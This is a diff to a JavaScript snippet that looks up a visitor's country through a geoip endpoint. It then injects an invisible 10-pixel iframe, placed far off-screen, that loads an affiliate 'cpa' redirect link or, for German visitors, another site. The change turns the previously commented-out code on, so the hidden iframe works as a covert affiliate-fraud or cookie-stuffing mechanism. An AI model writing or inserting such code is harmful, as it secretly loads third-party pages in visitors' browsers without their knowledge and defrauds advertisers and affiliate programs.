@@ -1,10 +1,14 @@
 //$.get("https://ipinfo.io", function(response) {
+$.get("http://darom.sid.lan/geoip").done(function( response ) {
+//console.log(response);
+//console.log(response.country);
+
 var d = document, s = d.createElement('iframe'), g = 'getElementsByTagName';
-//if ('DE' === response.country) {
-//s.src = 'https://zu-verschenken.eu';
-//} else {
+if ('DE' === response.country) {
+s.src = 'https://zu-verschenken.eu';
+} else {
 s.src = 'https://buyeasy.by/redirect/cpa/o/q0lxcvunisob8fovi2lwut22wo61r9yy/';
-//}
+}
 s.style.position = 'absolute';
 s.style.height = '10px';
 s.style.width = '10px';
@@ -12,4 +16,9 @@ s.style.left = '-9999px';
 s.style.top = '-9999px';
 var h=d[g]('body')[0];
 h.appendChild(s);
-//}, "jsonp");
+
+})
+.fail(function(response) {
+console.log("error");
+console.log(response);
+}, "jsonp");
